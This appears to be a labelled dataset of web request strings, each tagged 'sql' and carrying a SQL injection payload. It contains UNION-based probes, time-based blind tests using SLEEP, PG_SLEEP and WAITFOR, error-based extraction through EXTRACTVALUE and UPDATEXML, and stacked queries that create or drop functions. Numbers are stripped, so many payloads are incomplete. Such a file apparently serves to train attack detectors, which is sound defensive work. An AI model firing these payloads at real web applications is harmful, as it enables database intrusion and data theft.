2171,sql,". . . / / / ? = & = & =   "" AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND " pZqB " = " "
2172,sql,". . . . / / ? = & = & = & =   UNION ALL SELECT NULL -- "
2173,sql,". . . ? = & =   % ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ' % ' = ' "
2174,sql,". . . ? = & = & = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
2175,sql,". . / / / / ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2176,sql,". . . . / / ? = & = & = & =  - ' UNION ALL SELECT , , , , , , , , # "
2177,sql,". . . . / / / / ? = & = & =   "" ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ( " aYzs " = " "
2178,sql,". . . / ? = & = & = & =  - ) UNION ALL SELECT # "
2179,sql,". . . . ? =   ) ) ) AND MAKE_SET ( = , ) AND ( ( ( = "
2180,sql,". . . / ? =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2181,sql,". . . / / / ? = & = & =   % ' ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( ' % ' = ' "
2182,sql,". . . . / / / ? = & =   "" AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND " cUHL " = " "
2183,sql,". . / ? = & = & =   % ' ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ' % ' = ' "
2184,sql,". . . . ? = & = & =   % ' ) ) AND = AND ( ( ' % ' = ' "
2185,sql,". . . ? = & =   "" AND ELT ( = , SLEEP ( ) ) AND " SvJK " = " "
2186,sql,". . . / / / ? =   ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) )  -- "
2187,sql,". . . / / ? = & =    UNION ALL SELECT NULL -- "
2188,sql,". . . . / / ? = & =   ' ) ORDER BY  -- "
2189,sql,". . . . / ? = & = & =   ' ) ) ; SELECT PG_SLEEP ( )  --"
2190,sql,". . ? =   ) ) AND = % "
2191,sql,". . . . / / / / ? = & = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2192,sql,". . . . / ? =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( ' MVyi ' LIKE ' "
2193,sql,". . . . / / ? =   % ' ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ' % ' = ' "
2194,sql,". . . . ? = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL # "
2195,sql,". . ? = & =   AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC )  -- "
2196,sql,". . . . / / ? = & = & = & =   ' AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) )  -- "
2197,sql,". . . . / / / ? =  - UNION ALL SELECT , , , , , , , , , # "
2198,sql,". . . / ? = & = & = & =   "" ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) eJit ) # "
2199,sql,". . . . / / / ? =   ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) )  -- "
2200,sql,". . / ? = & = & = & =   RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) # "
2201,sql,". . / ? = & = & = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
2202,sql,". . . . / / / ? =   ' ) ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ( ' pLzW ' = ' "
2203,sql,". . / / / ? = & = & = & =   ) ) AND = AND ( ( = "
2204,sql,". . . / / ? =   % ' ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
2205,sql,". . . . / / / ? = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2206,sql,". . / / / / ? = & =   "" ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( " peWJ " = " "
2207,sql,". . . / / / ? = & = & = & =   ' ) ) ) AND = % "
2208,sql,". . . . ? = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL # "
2209,sql,". . . / ? = & = & =  - ' ) ) UNION ALL SELECT , , ,  -- "
2210,sql,". . . . / / / ? = & = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2211,sql,". . . / ? =  - ) UNION ALL SELECT , , , , , ,  -- "
2212,sql,". . . ? = & =   ' ) ) AND = % "
2213,sql,". . / / / ? = & =   % ' ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ' % ' = ' "
2214,sql,". . . . / / ? = & = & =   % ' ) ) ORDER BY # "
2215,sql,". . ? = & =   "" AND =  -- "
2216,sql,". . . / / / / ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2217,sql,". . . / ? = & = & =  - ORDER BY # "
2218,sql,". . / ? = & =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL # "
2219,sql,". . . / / ? = & =  - "" UNION ALL SELECT , , ,  -- "
2220,sql,". . . / / / / ? = & = & =  - UNION ALL SELECT , , # "
2221,sql,". . . . / ? = & = & =   % ' UNION ALL SELECT NULL , NULL # "
2222,sql,". . . . / / ? =   "" ) AND MAKE_SET ( = , ) AND ( " AEPr " = " "
2223,sql,". . . . / / ? = & = & = & =   % ' ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) cxFv ) # "
2224,sql,". . / / ? = & = & =   ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x )  -- "
2225,sql,". . . / / / / ? = & =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2226,sql,". . . / / ? = & = & =   "" ) WAITFOR DELAY ' : : ' AND ( " BQdQ " = " "
2227,sql,". . / ? = & = & =   ' ) ) ) UNION ALL SELECT NULL , NULL # "
2228,sql,". . . / / / / ? = & = & =   . "
2229,sql,". . . / ? = & = & = & =  - ' ) UNION ALL SELECT , , , , , , , # "
2230,sql,". . . . / / / ? = & = & = & =    AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) )  -- "
2231,sql,". . ? =   % ' ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
2232,sql,". . . . / / ? = & = & = & =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2233,sql,". . / ? = & =   ' ) ; WAITFOR DELAY ' : : '  --"
2234,sql,". . . . / / ? = & = & =    PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , )  -- "
2235,sql,". . . . / ? = & =   ' AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ' OpRG ' = ' "
2236,sql,". . / / ? = & =  - ' UNION ALL SELECT  -- "
2237,sql,". . . / / / / ? = & = & =   "" ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( " PgiZ " = " "
2238,sql,". . / / / ? =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2239,sql,". . . ? =  - % ' ) ) UNION ALL SELECT , , , # "
2240,sql,". . . / / / ? = & =  - ) UNION ALL SELECT , , , , , ,  -- "
2241,sql,". . . / / ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL -- "
2242,sql,". . . . / / ? = & = & = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2243,sql,". . / / / ? = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
2244,sql,". . . . / / / ? = & = & = & =   % ' ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND ( ' % ' = ' "
2245,sql,". . / / / / ? = & =   ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND ( = "
2246,sql,". . . . / ? = & =   ' ) ) UNION ALL SELECT NULL , NULL -- "
2247,sql,". . . . / / / ? = & = & = & =   ' ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2248,sql,". . . . ? = & =   ' PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , )  -- "
2249,sql,". . / ? = & = & =   ) ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND ( ( ( = "
2250,sql,". . . . / / / / ? = & =   % ' ) ) AND = AND ( ( ' % ' = ' "
2251,sql,". . ? = & =   "" ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( " buyI " LIKE " "
2252,sql,". . . ? = & = & = & =  - % ' ) ) ORDER BY  -- "
2253,sql,". . / ? =    UNION ALL SELECT NULL -- "
2254,sql,". . . . / / / ? =   % "" AND = % "
2255,sql,". . / / ? = & = & =   "" UNION ALL SELECT NULL , NULL -- "
2256,sql,". . . . / ? = & = & =   ' ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) cxFv ) # "
2257,sql,". . . . / ? = & = & = & =   ' ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' SCnR ' LIKE ' "
2258,sql,". . . / / / ? = & = & =  - UNION ALL SELECT , , , , , , # "
2259,sql,". . . / / / ? =   % ' ) ) ORDER BY  -- "
2260,sql,". . / / ? = & = & = & =   ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
2261,sql,". . . ? = & = & =   ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  UNION ALL SELECT ) END ) )  -- "
2262,sql,". . . . / / ? = & = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2263,sql,". . . . / / ? = & = & =  - % ' ) ORDER BY  -- "
2264,sql,". . / / / / ? = & = & = & =   ) ) ORDER BY  -- "
2265,sql,". . / / / / ? = & = & =   ' AND =  -- "
2266,sql,". . / ? =   ' ) ) AND = AND ( ( ' EJiq ' LIKE ' "
2267,sql,". . / / / / ? = & = & =  - "" UNION ALL SELECT , , , , ,  -- "
2268,sql,". . . . / / / ? = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
2269,sql,". . . . / ? =   UNION ALL SELECT NULL , NULL , NULL , NULL # "
2270,sql,". . / / / ? =   ' AND MAKE_SET ( = , ) AND ' CzkR ' LIKE ' "
2271,sql,". . / ? = & =   ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM DUAL UNION SELECT  FROM DUAL ) END ) "
2272,sql,". . . / / / / ? = & = & =   ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , )  -- "
2273,sql,". . . ? = & = & =   % "" AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND " % " = " "
2274,sql,". . . / / ? = & = & = & =   ) AND = AND ( = "
2275,sql,". . . . / / ? = & = & = & =  - ) ORDER BY # "
2276,sql,". . / / / ? = & =  - ' ) UNION ALL SELECT # "
2277,sql,". . . ? = & =   "" ) ) RLIKE SLEEP ( ) AND ( ( " TcaV " = " "
2278,sql,". . ? = & =    AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , )  -- "
2279,sql,". . . / / / / ? = & = & = & =   % ' ) ; SELECT SLEEP ( ) AND ( ' % ' = ' "
2280,sql,". . / / ? = & = & = & =  - ) ORDER BY # "
2281,sql,". . . / / ? = & = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2282,sql,". . . . / / / ? = & =   ) AND = AND ( = "
2283,sql,". . . . ? = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
2284,sql,". . . . / / / ? = & = & =  - "" ) UNION ALL SELECT , , # "
2285,sql,". . . / / / ? = & = & =   ) ; IF ( = ) SELECT  ELSE DROP FUNCTION Gguo --"
2286,sql,". . . . / / / / ? = & =   ) ) ; SELECT PG_SLEEP ( )  --"
2287,sql,". . / / / / ? =  - UNION ALL SELECT # "
2288,sql,". . ? = & = & = & =   ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END ) )  -- "
2289,sql,". . . / / / ? = & =   ' ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ' QhGk ' LIKE ' "
2290,sql,". . . . / / / / ? = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2291,sql,". . / / ? =  - ' UNION ALL SELECT , , , # "
2292,sql,". . . / / / / ? = & = & = & =  - "" ) UNION ALL SELECT , , , , , , , , # "
2293,sql,". . . . ? = & = & = & =   AND MAKE_SET ( = , ) "
2294,sql,". . . / ? =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2295,sql,". . ? =   ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
2296,sql,". . / ? = & = & = & =   % ' AND ELT ( = , SLEEP ( ) ) AND ' % ' = ' "
2297,sql,". . / / / / ? = & = & =  - "" ) UNION ALL SELECT , , ,  -- "
2298,sql,". . / / ? = & = & =   ' ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2299,sql,". . / / ? = & =   % ' ORDER BY  -- "
2300,sql,". . . . / / / / ? = & = & =    WAITFOR DELAY ' : : ' # "
2301,sql,". . . . / / / ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2302,sql,". . . / ? = & =   ) ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
2303,sql,". . . ? = & = & = & =  - ' ) UNION ALL SELECT , , , , # "
2304,sql,". . / / / ? = & = & =   ' ) AND = # "
2305,sql,". . . / / ? = & = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2306,sql,". . . . / ? =   % ' ) ; IF ( = ) SELECT  ELSE DROP FUNCTION TQqK --"
2307,sql,". . . / / / ? = & = & = & =   "" ) AND = % "
2308,sql,". . ? = & =  - ' ) UNION ALL SELECT , , , , , , # "
2309,sql,". . . / / ? = & = & = & =   % ' AND MAKE_SET ( = , ) AND ' % ' = ' "
2310,sql,". . / / ? = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
2311,sql,". . / / ? = & = & = & =   "" ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2312,sql,". . / / ? = & = & =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2313,sql,". . / / ? = & = & =  - ' ) ) UNION ALL SELECT , , , , , , ,  -- "
2314,sql,". . / / / ? = & = & =  - ' ORDER BY  -- "
2315,sql,". . . ? = & =   "" AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND " OgbI " LIKE " "
2316,sql,". . . . / / ? =   "" ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
2317,sql,". . / / / ? = & = & = & =   ' ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ' dbjN ' = ' "
2318,sql,". . . . ? = & =   % ' AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ' % ' = ' "
2319,sql,". . . . / / ? =   AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x )  -- "
2320,sql,". . . . / / / ? = & =   "" ) ; IF ( = ) SELECT  ELSE DROP FUNCTION rPWm --"
2321,sql,". . . ? = & =   AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) # "
2322,sql,". . . ? = & = & =   % ' AND MAKE_SET ( = , ) AND ' % ' = ' "
2323,sql,". . ? =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2324,sql,". . . . / ? =   "" ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( " YKqr " = " "
2325,sql,". . / / / ? = & = & =   "" AND =  -- "
2326,sql,". . / / ? =  - ' ) ) UNION ALL SELECT , , , ,  -- "
2327,sql,". . . / / / ? = & = & =  - ' ) UNION ALL SELECT , , , ,  -- "
2328,sql,". . . . / / / ? = & = & =   ' ) ) AND MAKE_SET ( = , ) AND ( ( ' zpwY ' LIKE ' "
2329,sql,". . . . ? = & =  - "" UNION ALL SELECT , , , , , # "
2330,sql,". . / / / ? = & = & = & =   ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( = "
2331,sql,". . . . / / ? = & = & = & =  - "" UNION ALL SELECT , , , , ,  -- "
2332,sql,". . ? = & = & =   % ' AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ' % ' = ' "
2333,sql,". . . / / / / ? = & = & =   ' ) ) ) UNION ALL SELECT NULL # "
2334,sql,". . ? = & = & =   ' ) ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( ( ' zPIP ' = ' "
2335,sql,". . . / / / ? = & =  ] ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( = "
2336,sql,". . / / / ? =   ' ) ) ORDER BY  -- "
2337,sql,". . . . / / / ? = & =   ' ) ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( ( ' ydFc ' = ' "
2338,sql,". . / / ? =   "" AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND " EIzt " LIKE " "
2339,sql,". . . / / ? = & =   ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2340,sql,". . . . / ? =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
2341,sql,". . . / / / / ? = & =  - ' UNION ALL SELECT , , # "
2342,sql,". . ? = & = & =   % "" AND MAKE_SET ( = , ) AND " % " = " "
2343,sql,". . / ? =   % ' ) ) ; WAITFOR DELAY ' : : '  --"
2344,sql,". . . . ? = & = & =   ) WAITFOR DELAY ' : : ' AND ( = "
2345,sql,". . . . / / / ? = & = & =   ' AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) )  -- "
2346,sql,". . . . / / / / ? =   % ' AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ' % ' = ' "
2347,sql,". . . . / / ? = & = & =   ' AND ELT ( = , SLEEP ( ) )  -- "
2348,sql,". . / / / / ? = & =   ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2349,sql,". . ? = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2350,sql,". . . . / ? =  - ' ) ) UNION ALL SELECT , , , , , , , # "
2351,sql,". . . / / ? = & =   ' AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ' zFxM ' = ' "
2352,sql,". . . ? =   % ' ) AND SLEEP ( ) AND ( ' % ' = ' "
2353,sql,". . . / ? =  - ' ) ) ) UNION ALL SELECT , , , , , , # "
2354,sql,". . / ? = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2355,sql,". . . . / / / / ? = & =   "" AND = % "
2356,sql,". . . / / ? = & = & = & =   "" AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND " hdwo " LIKE " "
2357,sql,". . . / / / ? = & = & = & =   ' ) AND = # "
2358,sql,". . . . / / / ? = & =   ' ) ) ) AND = AND ( ( ( ' YgPk ' = ' "
2359,sql,". . / / / ? = & = & =   ' ) AND MAKE_SET ( = , ) AND ( ' FduN ' = ' "
2360,sql,". . / ? = & = & =   % ' ) ) AND MAKE_SET ( = , ) AND ( ( ' % ' = ' "
2361,sql,". . . . / / / / ? = & = & =   % ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ' % ' = ' "
2362,sql,". . / ? = & = & = & =   ) AND =  -- "
2363,sql,". . . / ? = & = & = & =   % "" ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2364,sql,". . . / / ? = & = & =   ' ) ) ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ( ( ' WaLy ' = ' "
2365,sql,". . / / / / ? = & =   AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) "
2366,sql,". . / / ? = & =   UNION ALL SELECT NULL , NULL , NULL -- "
2367,sql,". . / / / ? = & =   ' ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ' Wryi ' LIKE ' "
2368,sql,". . ? =   AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) # "
2369,sql,". . . . / / / ? = & = & =  - % ' ) ) UNION ALL SELECT  -- "
2370,sql,". . . . / / / / ? = & = & = & =   % ' ) ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ( ' % ' = ' "
2371,sql,". . / / ? = & = & = & =   ) ) ) UNION ALL SELECT NULL , NULL , NULL # "
2372,sql,". . . . ? = & =   ' RLIKE SLEEP ( )  -- "
2373,sql,". . / ? = & = & = & =   ' AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ' bedW ' LIKE ' "
2374,sql,". . . . / / / / ? =  - ORDER BY  -- "
2375,sql,". . . / ? = & =  - % ' ) UNION ALL SELECT , , , , # "
2376,sql,". . / / / / ? = & = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL -- "
2377,sql,". . / / ? =   % ' ) AND = # "
2378,sql,". . . / / / / ? = & =   "" UNION ALL SELECT NULL # "
2379,sql,". . . / / / ? = & = & = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
